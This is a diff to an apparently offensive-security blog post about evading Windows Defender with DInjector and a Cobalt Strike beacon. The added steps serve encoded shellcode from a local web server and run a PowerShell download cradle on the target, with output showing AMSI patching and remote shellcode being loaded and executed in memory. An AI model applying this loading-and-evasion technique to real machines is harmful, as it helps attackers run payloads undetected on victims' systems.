@@ -183,11 +183,30 @@ It succesfully beat a fully updated Windows Defender, I was surprised!
 The process would be quite similar on cobaltstrike as well. Here we use a RAW x64 beacon instead of the msfvenom shellcode.
 
 ![img](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/main/assets/images/post2/cobalt1.png)
+
 ![img](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/main/assets/images/post2/cobalt2.png)
 
 Afterwards we go on to encode the generated shellcode one more time :
 
 ![img](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/main/assets/images/post2/cobalt3.png)
+
+Lastly initiate a web server to serve the shellcode and execute ``cradle.ps1`` once more at the target :
+
+```zsh
+➜  DInjector git:(main) ✗ python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+```
+
+```powershell
+PS C:\users\pi0x73\Downloads> ./cradle.ps1
+(AM51) [+] NtProtectVirtualMemory
+(AM51) [>] Patching at address: 7FFA13B535E0
+(AM51) [+] NtProtectVirtualMemory
+(Detonator) [*] Loading sc from URL
+(CurrentThread) [+] NtAllocateVirtualMemory, PAGE_READWRITE
+(CurrentThread) [+] NtProtectVirtualMemory, PAGE_EXECUTE_READ
+(CurrentThread) [+] NtCreateThreadEx
+```
 
 ### References
 
